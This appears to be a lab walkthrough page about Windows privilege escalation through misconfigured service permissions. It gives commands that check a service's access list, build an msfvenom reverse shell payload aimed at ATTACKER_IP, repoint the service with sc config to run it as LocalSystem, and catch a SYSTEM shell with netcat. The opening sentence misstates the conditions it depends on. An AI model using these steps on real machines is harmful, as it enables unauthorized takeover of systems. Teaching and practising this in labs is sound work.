---
sidebar_position: 4
title: Insecure Service Permissions
---


It is possible taking advantage of a Service if the Service's Executable **`DACL` (Discretionary Access Control Lists )** is well Configured and the Service Binary PATH is rightly Quoted. 
If the Service `DACL` allow us to Modify the Configuration of a Service we will be able to Reconfigure the Service. **(This will allow us to point to any Executable)**

<br/>

- We can use <b style={{ color: 'Coral' }}>AccessChk</b> to check for a Service <span style={{fontWeight: 'Bold'}}>DACL</span> from the <span style={{fontWeight: 'Bold'}}>CMD</span>

```batch
accesschk <file, directory, registry key, process, service, object>
```

---

## Service Analysis


- The Group <b style={{ color: 'DeepSkyBlue' }}>BUILTIN\\Users:(SERVICE_ALL_ACCESS)</b> can Reconfigure any Service.

```log {6-7}
C:\tools\AccessChk> accesschk64.exe /accepteula
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        [...]
        [...]
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

<br/>

### PAYLOAD

- Generating and Transferring the **PAYLOAD**

```js
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
```

<br/>

- Granting <b style={{ color: 'DeepSkyBlue' }}>Everyone:(F)</b> Permissions to the <span style={{fontWeight: 'Bold'}}>PAYLOAD</span>

```batch
C:\> icacls C:\Users\thm-unpriv\rev-svc.exe /grant Everyone:F
```

<br/>


### Modifying The Service


- Modifying the **Service.** We chose <b style={{ color: 'Red' }}>LocalSystem</b> as it is the Highest Privileged Account available.

```powershell
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```

<br/>


### Restarting The Service

- Starting a `netcat` Listener
- Restarting the <b style={{ color: 'MediumTurquoise' }}>THMService</b> Service. <span style={{fontWeight: 'Bold'}}>[In a Normal case Scenario we would have to Wait for a Service Restart]</span>

```batch
C:\> sc stop  "THMService"
C:\> sc start "THMService"
```

```bash
attacker@machine:~$ nc -lvp 4447
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```